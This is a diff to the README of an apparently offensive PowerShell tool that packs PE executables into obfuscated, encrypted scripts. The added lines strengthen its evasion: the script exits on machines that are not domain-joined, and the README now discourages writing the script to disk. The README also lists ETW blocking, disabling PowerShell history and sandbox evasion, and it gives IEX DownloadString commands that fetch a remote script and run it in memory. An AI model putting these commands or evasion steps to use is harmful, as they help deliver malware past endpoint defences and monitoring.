@@ -10,6 +10,7 @@ It generates an obfuscated and encrypted PowerShell script that contains the PE 
   - Blocking Event Tracing for Windows (ETW)
   - Disabling PowerShell history logging
   - Basic sandbox evasion techniques (optional)
+    - stop/exit if the PowerShell script is not run on a domain-joined Windows computer 
     - stop/exit if the PowerShell session is being debugged (detection based on "Test-Path Variable:PSDebugContext")
     - wait for 60 seconds before execution
   
@@ -32,7 +33,7 @@ PS C:\> Invoke-PoSH-PePacker -FileUrl https://URL/PE-file.exe -OutFile C:\path\P
 PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://URL/Packed-PE-file.ps1'); Execute-PE
 --- or ---
 PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://URL/Packed-PE-file.ps1'); Execute-PE argument1 argument2 ...
---- or ---
+--- or (not recommended) ---
 PS C:\> WGET -URI https://URL/Packed-PE-file.ps1 -OutFile C:\temp\Packed-PE-file.ps1
 PS C:\> Import-Module C:\temp\Packed-PE-file.ps1
 PS C:\> Execute-PE
